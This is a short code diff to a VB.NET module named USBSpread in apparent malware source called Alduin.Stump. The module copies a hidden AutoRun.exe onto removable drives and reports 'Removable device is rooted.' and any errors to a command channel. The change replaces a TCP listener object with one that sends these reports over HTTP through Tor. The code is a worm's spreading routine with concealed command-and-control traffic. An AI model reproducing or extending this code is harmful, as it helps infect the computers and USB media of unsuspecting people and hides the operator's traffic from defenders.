@@ -3,7 +3,7 @@ Imports Alduin.Stump.Alduin.Stump.Class.Network
 
 Module USBSpread
     Public Sub USBSpreading(ByVal source As String)
-        Dim TcpListen As New TcpListen
+        Dim http As New SendHTTPonTor
         Dim drives As DriveInfo() = DriveInfo.GetDrives()
         Try
 
@@ -27,13 +27,13 @@ Module USBSpread
 
                         File.SetAttributes(String.Concat(drive.Name, "AutoRun.exe"), FileAttributes.Hidden)
                     Finally
-                        TcpListen.TalkChannelHTTP("Removable device is rooted.")
+                        http.TalkChannelHTTP("Removable device is rooted.")
                     End Try
                 End If
             Next
 
         Catch ex As Exception
-            TcpListen.TalkChannelHTTP("Exception: " & ex.ToString())
+            http.TalkChannelHTTP("Exception: " & ex.ToString())
         End Try
     End Sub
 End Module
